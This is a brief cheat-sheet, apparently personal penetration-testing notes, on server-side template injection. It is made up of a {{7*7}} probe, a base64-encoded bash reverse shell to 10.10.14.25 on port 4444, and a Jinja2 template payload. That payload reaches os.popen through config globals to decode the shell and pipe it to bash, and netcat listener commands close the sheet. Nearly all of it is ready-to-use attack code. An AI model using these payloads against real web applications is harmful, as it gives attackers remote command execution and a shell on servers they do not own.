# SSTI



Payload

```bash
{{7*7}}
```



Reverse shell bash encoded

```bash
echo -ne 'bash -i >& /dev/tcp/10.10.14.25/4444 0>&1' | base64
YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4yNS80NDQ0IDA+JjE=
nc -lvvp 4444
```

Reverse shell template injection

```bash
{{config.__class__.__init__.__globals__['os'].popen('echo${IFS}YmFzaCAtaSA+JiAvZG
V2L3RjcC8xMC4xMC4xNC4yMy80NDQ0IDA+JjE=${IFS}|base64${IFS}-d|bash').read()}}
```

Listen

```bash
nc -lnvvp 4444
```
